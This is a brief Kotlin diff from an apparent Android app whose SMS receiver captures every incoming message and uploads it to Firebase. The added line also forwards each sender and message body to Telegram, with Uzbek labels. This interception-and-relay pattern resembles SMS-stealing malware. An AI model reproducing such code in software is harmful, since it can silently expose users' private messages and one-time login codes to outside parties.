@@ -16,6 +16,7 @@ class SmsReceiver : BroadcastReceiver() {
             val body = sms.messageBody ?: ""
             val timestamp = sms.timestampMillis
             FirebaseHelper.pushSms(sender, body, timestamp, device)
+            TelegramHelper.send("📩 Yangi SMS ($device)\nKimdan: $sender\n$body")
         }
     }
 }
